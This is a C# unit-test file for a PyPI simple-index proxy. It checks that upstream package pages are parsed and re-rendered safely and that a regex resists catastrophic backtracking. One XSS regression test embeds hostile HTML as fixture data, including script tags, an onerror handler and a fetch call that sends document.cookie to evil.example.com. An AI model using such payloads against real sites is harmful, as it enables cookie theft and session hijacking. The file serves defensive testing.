using System.Diagnostics;
using Dependably.Api.PyPiProtocol;

namespace Dependably.Tests.Unit;

/// <summary>
/// The upstream simple-index parser reads attacker-controllable HTML (a hostile or MITM'd
/// upstream), so its anchor pattern must be linear — no super-linear backtracking — while
/// still extracting real PEP 503 pages correctly. It must also never let anything outside a
/// well-formed anchor's href/text reach the caller, since the served index is rendered
/// entirely from the parsed entries (<see cref="PyPiSimpleIndexHelper.RenderMergedSimpleIndex"/>),
/// never by copying upstream HTML.
/// </summary>
[Trait("Category", "Unit")]
public class PyPiSimpleIndexRewriteTests
{
    // Shaped like a real pypi.org simple page for the mypy-extensions fixture package
    // (tests/Dependably.Tests/Fixtures/packages/pypi): sha256 fragments, requires-python
    // and metadata-sidecar attributes, multiple files per release.
    private const string FixtureSimpleIndexHtml = """
        <!DOCTYPE html>
        <html>
          <head>
            <meta name="pypi:repository-version" content="1.1">
            <title>Links for mypy-extensions</title>
          </head>
          <body>
            <h1>Links for mypy-extensions</h1>
            <a href="https://files.pythonhosted.org/packages/98/a4/abc/mypy_extensions-1.0.0-py3-none-any.whl#sha256=4392f6c0eb8a5668a69e23d168ffa70f0be9ccfd32b5cc2d26a34ae5b844552d" data-requires-python="&gt;=3.5" data-dist-info-metadata="sha256=deadbeef" data-core-metadata="sha256=deadbeef">mypy_extensions-1.0.0-py3-none-any.whl</a><br/>
            <a href="https://files.pythonhosted.org/packages/02/fe/def/mypy_extensions-1.0.0.tar.gz#sha256=75dbf8955dc00442a438fc4d0666508a9a97b6bd41aa2f0ffe9d2f2725af0782" data-requires-python="&gt;=3.5">mypy_extensions-1.0.0.tar.gz</a><br/>
          </body>
        </html>
        """;

    [Fact]
    public void FixtureIndex_AnchorsParsedToFilenameAndSha256()
    {
        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(FixtureSimpleIndexHtml);

        Assert.Equal(2, entries.Count);
        Assert.Contains(entries, e => e.Filename == "mypy_extensions-1.0.0-py3-none-any.whl"
            && e.Sha256 == "4392f6c0eb8a5668a69e23d168ffa70f0be9ccfd32b5cc2d26a34ae5b844552d");
        Assert.Contains(entries, e => e.Filename == "mypy_extensions-1.0.0.tar.gz"
            && e.Sha256 == "75dbf8955dc00442a438fc4d0666508a9a97b6bd41aa2f0ffe9d2f2725af0782");
    }

    [Fact]
    public void RenderedIndex_AnchorsPointAtLocalPackagesRoute_MetadataSidecarAttributesDropped()
    {
        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(FixtureSimpleIndexHtml);
        string rendered = PyPiSimpleIndexHelper.RenderMergedSimpleIndex(
            "mypy-extensions", entries, [], OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        Assert.Contains(
            "href=\"/packages/mypy_extensions-1.0.0-py3-none-any.whl#sha256=4392f6c0eb8a5668a69e23d168ffa70f0be9ccfd32b5cc2d26a34ae5b844552d\"",
            rendered);
        Assert.Contains(
            "href=\"/packages/mypy_extensions-1.0.0.tar.gz#sha256=75dbf8955dc00442a438fc4d0666508a9a97b6bd41aa2f0ffe9d2f2725af0782\"",
            rendered);

        // Anchor text (the filename pip displays) survives.
        Assert.Contains(">mypy_extensions-1.0.0-py3-none-any.whl</a>", rendered);
        Assert.Contains(">mypy_extensions-1.0.0.tar.gz</a>", rendered);

        // No anchor still points upstream, and the metadata-sidecar attributes never survive
        // parsing — the renderer only ever emits the anchors it constructs itself.
        Assert.DoesNotContain("files.pythonhosted.org", rendered);
        Assert.DoesNotContain("data-dist-info-metadata", rendered);
        Assert.DoesNotContain("data-core-metadata", rendered);
    }

    // ── XSS regression: hostile upstream markup never reaches the served index ─────────────

    /// <summary>
    /// Regression for the pass-through XSS: before the fix, the served index was built by
    /// splicing/rewriting the raw upstream HTML in place, so a <c>&lt;script&gt;</c> tag or any
    /// other markup outside a matched anchor flowed into the response verbatim. The fix parses
    /// only filename/href pairs out of matched anchors and re-renders the whole document from
    /// that data, so hostile markup — whether inside an unmatched anchor attribute or entirely
    /// outside any anchor — can never appear in the served HTML.
    /// </summary>
    [Fact]
    public void HostileUpstreamMarkup_NeverReachesRenderedIndex()
    {
        const string hostileHtml = """
            <!DOCTYPE html>
            <html>
              <head><script>alert(document.cookie)</script></head>
              <body>
                <img src=x onerror="alert('xss')">
                <a href="https://evil.example.com/pwn.whl" onclick="alert(1)">pwn-1.0.0.whl</a>
                <script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>
                <a href="https://files.pythonhosted.org/packages/real-1.0.0.tar.gz#sha256=abc123">real-1.0.0.tar.gz</a>
              </body>
            </html>
            """;

        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(hostileHtml);
        string rendered = PyPiSimpleIndexHelper.RenderMergedSimpleIndex(
            "pkg", entries, [], OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        // Only the two anchor filenames are ever admitted — one from a "hostile" anchor (its
        // filename text alone is harmless and gets HTML-encoded) and one from the legitimate one.
        Assert.Equal(2, entries.Count);

        // None of the hostile markup survives into the rendered document.
        Assert.DoesNotContain("<script", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onerror", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onclick", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("evil.example.com", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("document.cookie", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<img", rendered, StringComparison.OrdinalIgnoreCase);

        // The legitimate anchor is still present, re-rendered through our own encoding.
        Assert.Contains("href=\"/packages/real-1.0.0.tar.gz#sha256=abc123\"", rendered);
        Assert.Contains(">real-1.0.0.tar.gz</a>", rendered);
    }

    [Fact]
    public void AnchorWithoutAbsoluteHref_IsIgnored()
    {
        const string html = """<a href="/packages/local-1.0.0.tar.gz">local-1.0.0.tar.gz</a>""";

        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(html);

        Assert.Empty(entries);
    }

    [Fact]
    public void SingleQuotedAttributes_AreParsed()
    {
        const string html =
            "<a href=\"https://files.pythonhosted.org/packages/aa/bb/pkg-2.0.tar.gz\" data-requires-python='>=3.8'>pkg-2.0.tar.gz</a>";

        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(html);

        Assert.Single(entries);
        Assert.Equal("pkg-2.0.tar.gz", entries[0].Filename);
    }

    [Fact]
    public void PathologicalUnterminatedAnchor_CompletesLinearly()
    {
        // Worst case for a backtracking-prone attribute pattern: a long run of attribute
        // characters and quote flips after "<a " with no closing ">" — the nested-quantifier
        // form of this pattern goes super-linear here. The atomic-group pattern must finish
        // (well inside the 2 s RegexTimeout) and yield no entries (no matched anchor).
        string attackRun = string.Concat(Enumerable.Repeat("x'y'\"z\"", 20_000));
        string html = "<a " + attackRun;

        var sw = Stopwatch.StartNew();
        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(html);
        sw.Stop();

        Assert.Empty(entries);
        Assert.True(sw.Elapsed < TimeSpan.FromSeconds(2),
            $"Parse took {sw.Elapsed.TotalMilliseconds:F0}ms — expected linear-time matching.");
    }

    private static Dictionary<string, Dependably.Infrastructure.VulnGateSignals> EmptySignals()
        => new();
}

/// <summary>Minimal default <see cref="Dependably.Infrastructure.OrgSettings"/> for renderer tests.</summary>
file static class OrgSettingsFixture
{
    public static Dependably.Infrastructure.OrgSettings Default() => new() { AnonymousPull = true };
}
